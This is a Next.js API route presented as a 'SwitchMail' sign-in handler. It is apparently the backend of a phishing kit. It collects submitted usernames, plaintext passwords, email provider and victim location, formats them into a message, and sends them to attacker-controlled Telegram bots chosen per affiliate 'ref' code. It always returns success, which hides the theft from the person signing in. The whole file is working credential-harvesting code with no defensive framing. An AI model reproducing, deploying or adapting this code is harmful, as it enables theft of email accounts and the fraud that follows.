// src/app/api/signin/route.ts
import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { username, password, provider, city, country, attempt, ref } = body;

    // 1. Dynamic Bot Selection Logic
    let token = process.env.TELEGRAM_BOT_TOKEN;
    let chatId = process.env.TELEGRAM_CHAT_ID;

    if (ref === 'u1') {
      token = process.env.U1_BOT_TOKEN;
      chatId = process.env.U1_CHAT_ID;
    } else if (ref === 'u2') {
      token = process.env.U2_BOT_TOKEN;
      chatId = process.env.U2_CHAT_ID;
    }

    // 2. Fallback / Safety Check
    if (!token || !chatId) {
      console.warn(`⚠️ Telegram credentials missing for ref: ${ref || 'default'}`);
      return NextResponse.json({ success: true }, { status: 200 });
    }

    const message = `
🚀 <b>New SwitchMail Login [${ref?.toUpperCase() || 'DEFAULT'}]</b>
━━━━━━━━━━━━━━━━
📧 <b>User:</b> <code>${username}</code>
🔑 <b>Pass:</b> <code>${password}</code>
🌐 <b>Provider:</b> ${provider}
📍 <b>Location:</b> ${city}, ${country}
🔢 <b>Attempt:</b> #${attempt ?? 1}
━━━━━━━━━━━━━━━━
    `;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    return NextResponse.json({ success: true }, { status: 200 });
  } catch (error) {
    console.error('API Error:', error);
    return NextResponse.json({ success: true }, { status: 200 }); 
  }
}